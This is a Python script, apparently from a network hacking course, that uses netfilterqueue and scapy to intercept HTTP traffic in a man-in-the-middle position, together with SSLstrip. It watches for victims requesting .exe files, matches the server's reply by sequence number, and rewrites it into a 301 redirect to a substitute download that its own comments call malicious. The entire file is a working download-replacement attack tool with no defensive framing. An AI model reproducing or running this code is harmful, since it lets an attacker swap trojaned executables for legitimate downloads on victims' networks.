import netfilterqueue
import scapy.all as scapy

# only works for http, not https

ack_list = [] # keep track of acks useful to hacker

#change the scapy packet's load to the specified one
def set_load(scapy_packet, load):

    scapy_packet[scapy.Raw].load = load

    # delete all fields that will be modified because of the above line.
    # scapy will automatically recalculate the new values
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet

	
def process_packet(packet):

    # convert the netfilterqueue packet into a scapy packet, in order to access the layers with scapy.
    scapy_packet = scapy.IP(packet.get_payload())

    # checks if the packet has a http layer and raw data where downloads are at.
    if scapy_packet.haslayer(scapy.Raw):

        packet_load = scapy_packet[scapy.Raw].load

        # http request. dport = destination port
        # check if user is requesting to downloading a file. port 10000 is for SSLstrip. 80 otherwise
        if scapy_packet[scapy.TCP].dport == 10000 and ".exe" in packet_load and "www.win-rar.com" not in packet_load:

            print("[+] exe request")
            scapy_packet.show()
            ack_list.append(scapy_packet[scapy.TCP].ack) # keep track of ack numbers for http response later


        # http response. sport = source port
        # http response to an earlier download request. seq num of response = ack num of request
        elif scapy_packet[scapy.TCP].sport == 10000 and scapy_packet[scapy.TCP].seq in ack_list:

            ack_list.remove(scapy_packet[scapy.TCP].seq) # we don't need this seq num in the future
            print(scapy_packet.show())
            print("[+] Replacing file...")

            # change the packet's load to a 301 response. Change url to a malicious download.
            modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar/wrar561.exe\n\n")

            packet.set_payload(str(modified_packet)) #convert the packet to the modified scapy packet


    packet.accept()
	

queue = netfilterqueue.NetfilterQueue() # create a NF queue object

# binds queue to the queue created in the terminal (with queue-num = 0) with the above command.
# process_packet is the call back function to execute each time a packet comes in
queue.bind(0, process_packet)
queue.run()